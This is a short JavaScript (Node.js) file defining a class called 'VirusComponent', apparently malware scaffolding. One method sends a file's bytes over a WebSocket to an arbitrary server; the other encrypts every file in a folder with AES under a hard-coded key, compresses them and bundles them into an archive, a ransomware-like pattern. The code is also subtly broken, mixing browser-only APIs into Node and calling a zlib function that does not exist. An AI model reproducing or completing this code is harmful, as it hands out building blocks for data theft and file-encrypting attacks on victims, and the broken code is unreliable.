const fs = require('fs');
const path = require('path');
const zlib = require('zlib');
const crypto = require('crypto');

class VirusComponent {
    sendFileToServer(url, file) {
        return new Promise((resolve, reject) => {
            const socket = new WebSocket(url);

            socket.onopen = () => {
                // Convert the file to binary data
                const reader = new FileReader();
                reader.onload = () => {
                    const fileData = reader.result;
                    socket.send(fileData);
                };
                reader.onerror = (error) => reject(error);
                reader.readAsArrayBuffer(file);
            };

            socket.onerror = (error) => reject(error);

            socket.onmessage = (event) => {
                const response = event.data;
                resolve(response);
            };

            socket.onclose = () => resolve('Connection closed');
        });
    }

    encryptAndCompressFolder(folderPath) {

        return new Promise((resolve, reject) => {
            // Read the files in the folder
            fs.readdir(folderPath, (err, files) => {
                if (err) {
                    reject(err);
                    return;
                }

                // Create a temporary folder to store the encrypted files
                const tempFolderPath = path.join(folderPath, 'temp');
                fs.mkdirSync(tempFolderPath);

                // Encrypt and compress each file
                const promises = files.map((file) => {
                    return new Promise((resolve, reject) => {
                        const filePath = path.join(folderPath, file);
                        const tempFilePath = path.join(tempFolderPath, file);

                        // Read the file
                        fs.readFile(filePath, (err, data) => {
                            if (err) {
                                reject(err);
                                return;
                            }

                            // Encrypt the file data
                            const cipher = crypto.createCipher('aes-256-cbc', 'encryptionKey');
                            const encryptedData = Buffer.concat([cipher.update(data), cipher.final()]);

                            // Compress the encrypted data
                            zlib.gzip(encryptedData, (err, compressedData) => {
                                if (err) {
                                    reject(err);
                                    return;
                                }

                                // Write the compressed data to the temporary file
                                fs.writeFile(tempFilePath, compressedData, (err) => {
                                    if (err) {
                                        reject(err);
                                        return;
                                    }

                                    resolve();
                                });
                            });
                        });
                    });
                });

                // Wait for all files to be encrypted and compressed
                Promise.all(promises)
                    .then(() => {
                        // Compress the temporary folder
                        const compressedFolderPath = path.join(folderPath, 'compressed.zip');
                        const output = fs.createWriteStream(compressedFolderPath);
                        const archive = zlib.createZip();

                        output.on('close', () => {
                            // Remove the temporary folder
                            fs.rmdirSync(tempFolderPath, { recursive: true });

                            resolve('Encryption and compression completed');
                        });

                        archive.directory(tempFolderPath, false);
                        archive.pipe(output);
                        archive.finalize();
                    })
                    .catch((err) => reject(err));
            });
        });
    }
}